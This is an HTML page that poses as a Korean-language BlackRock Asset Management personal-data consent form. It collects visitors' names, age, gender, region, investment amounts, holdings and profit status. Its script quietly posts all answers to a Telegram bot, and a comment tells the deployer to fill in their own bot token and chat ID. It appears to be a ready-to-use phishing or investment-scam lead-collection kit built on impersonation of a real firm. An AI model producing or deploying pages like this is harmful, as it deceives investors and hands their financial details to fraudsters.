<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>블랙록 개인정보 동의서</title>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <style>
    :root { --navy: #0d2f52; --border: #0d2f52; }
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
    
    body { background-color: #f4f4f4; font-family: 'Noto Sans KR', sans-serif; }

    .doc-page {
      width: 100%;
      max-width: 650px;
      margin: 0 auto;
      background-color: #fff;
      position: relative;
      /* 배경 이미지 삽입부 */
      background-image: url('be.png'); 
      background-size: 100% auto;
      background-position: top center;
      background-repeat: no-repeat;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .form-content {
      padding: 220px 25px 80px; /* 하단 버튼 잘림 방지를 위해 아래 여백(80px) 확보 */
      flex: 1;
    }

    .main-title {
      font-size: 30px;
      font-weight: 900;
      color: var(--navy);
      text-align: center;
      margin-bottom: 35px;
      letter-spacing: -1px;
    }

    .info-table {
      width: 100%;
      border: 2.5px solid var(--border);
      background: rgba(255, 255, 255, 0.9);
      margin-bottom: 30px;
    }

    .info-row {
      display: flex;
      border-bottom: 1.5px solid var(--border);
      min-height: 58px;
    }

    .info-row:last-child { border-bottom: none; }

    .label {
      flex: 0 0 100px;
      background: #f0f3f6;
      color: var(--navy);
      font-weight: 700;
      font-size: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-right: 1.5px solid var(--border);
    }

    .input-box { flex: 1; padding: 10px 15px; display: flex; align-items: center; }
    .input-box input, .input-box select {
      width: 100%; border: none; background: transparent; font-size: 16px; outline: none; color: #333;
    }

    .legal-notice {
      font-size: 14px; line-height: 1.8; color: #333; margin-bottom: 40px; word-break: keep-all;
    }

    .date-wrap { text-align: center; margin-bottom: 40px; font-size: 18px; }
    .date-wrap select { border: none; border-bottom: 2px solid #333; font-weight: 700; font-size: 18px; margin: 0 5px; }

    .signature-section { text-align: center; margin-bottom: 50px; }
    .company-title { font-size: 19px; font-weight: 800; color: var(--navy); margin-bottom: 15px; }
    .manager-field { display: inline-block; width: 220px; text-align: left; border-bottom: 1px solid #000; font-size: 15px; padding-bottom: 5px; color: #555; }

    .submit-btn {
      width: 100%; padding: 22px; background: var(--navy); color: white; border: none; font-size: 19px; font-weight: 700; border-radius: 8px; cursor: pointer;
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }

    @media (max-width: 480px) {
      .form-content { padding-top: 180px; }
      .main-title { font-size: 24px; }
      .label { flex: 0 0 85px; font-size: 13px; }
    }
  </style>
</head>
<body>

<div class="doc-page">
  <div class="form-content">
    <h1 class="main-title">블랙록 개인정보 동의서</h1>

    <form id="tgForm">
      <div class="info-table">
        <div class="info-row"><div class="label">성 명</div><div class="input-box"><input type="text" id="name" required></div></div>
        <div class="info-row">
          <div class="label">나 이</div>
          <div class="input-box">
            <select id="age" required>
              <option value="">나이대 선택</option>
              <option>20~30대</option><option>40~50대</option><option>60대 이상</option>
            </select>
          </div>
        </div>
        <div class="info-row">
          <div class="label">성 별</div>
          <div class="input-box">
            <select id="gender" required><option value="">선택</option><option>남성</option><option>여성</option></select>
          </div>
        </div>
        <div class="info-row">
          <div class="label">거 주 지</div>
          <div class="input-box">
            <select id="addr" required>
              <option value="">지역 선택</option>
              <option>서울특별시</option><option>경기도</option><option>인천광역시</option><option>부산광역시</option>
              <option>대구광역시</option><option>광주광역시</option><option>대전광역시</option><option>울산광역시</option>
              <option>세종특별자치시</option><option>강원도</option><option>충청도</option><option>전라도</option><option>경상도</option><option>제주도</option>
            </select>
          </div>
        </div>
        <div class="info-row">
          <div class="label">투자기간</div>
          <div class="input-box">
            <select id="term" required><option value="">기간 선택</option><option>1년 이하</option><option>3년 이상</option><option>5년 이상</option></select>
          </div>
        </div>
        <div class="info-row">
          <div class="label">투자금</div>
          <div class="input-box">
            <select id="money" required>
              <option value="">금액 선택</option>
              <option>2천만원 이하</option><option>5천만원 이상</option><option>1억원 이상</option><option>1억 5천만원 이상</option>
            </select>
          </div>
        </div>
        <div class="info-row">
          <div class="label">보유종목</div>
          <div class="input-box"><input type="text" id="stock" placeholder="ex) 삼성전자, 비트코인"></div>
        </div>
        <div class="info-row">
          <div class="label">수익현황</div>
          <div class="input-box"><input type="text" id="profit" placeholder="ex) +15%, 수익중"></div>
        </div>
      </div>

      <div class="legal-notice">
        블랙록자산운용은 개인정보보호법 제 30 조에 따라 정보주체(고객)의 개인정보 보호 및 권익을 보호하고 개인정보와 관련한 정보주체의 고충을 원활하게 처리 하고 있습니다.<br><br>
        본 방침은 관련 법령의 제·개정 및 회사의 운용방침에 따라 변경될 수 있습니다.
      </div>

      <div class="date-wrap">
        <span>2026년</span> <select id="m"></select><span>월</span> <select id="d"></select><span>일</span>
      </div>

      <div class="signature-section">
        <div class="company-title">블랙록자산운용주식회사 (비상장)</div>
        <div class="manager-field">작성책임자: </div>
      </div>

      <button type="submit" class="submit-btn">내용 확인 및 동의 완료</button>
    </form>
  </div>
</div>

<script>
  // 날짜 생성
  const ms = document.getElementById('m'), ds = document.getElementById('d'), now = new Date();
  for(let i=1; i<=12; i++) {
    let o = document.createElement('option'); o.value=i; o.text=i;
    if(i===now.getMonth()+1) o.selected=true; ms.appendChild(o);
  }
  function upD() {
    ds.innerHTML=""; const last = new Date(2026, ms.value, 0).getDate();
    for(let i=1; i<=last; i++) {
      let o = document.createElement('option'); o.value=i; o.text=i;
      if(i===now.getDate()) o.selected=true; ds.appendChild(o);
    }
  }
  ms.onchange = upD; upD();

  // 텔레그램 전송 로직
  document.getElementById('tgForm').onsubmit = async (e) => {
    e.preventDefault();
    
    // ⚠️ 여기에 본인의 봇 정보를 입력하세요
    const BOT_TOKEN = '여기에_토큰_입력'; 
    const CHAT_ID = '여기에_채팅ID_입력';

    const text = `🔔 [블랙록 동의서 접수]\n\n` +
                 `👤 성명: ${document.getElementById('name').value}\n` +
                 `🎂 나이: ${document.getElementById('age').value}\n` +
                 `🚻 성별: ${document.getElementById('gender').value}\n` +
                 `📍 거주지: ${document.getElementById('addr').value}\n` +
                 `⏳ 투자기간: ${document.getElementById('term').value}\n` +
                 `💰 투자금: ${document.getElementById('money').value}\n` +
                 `📈 보유종목: ${document.getElementById('stock').value || '없음'}\n` +
                 `📊 수익현황: ${document.getElementById('profit').value || '없음'}\n` +
                 `📅 날짜: 2026년 ${ms.value}월 ${ds.value}일`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });
      if(response.ok) {
        alert('정상적으로 동의 및 전송되었습니다.');
      } else {
        alert('전송 오류가 발생했습니다. 다시 시도해주세요.');
      }
    } catch(err) {
      alert('네트워크 오류가 발생했습니다.');
    }
  };
</script>
</body>
</html>
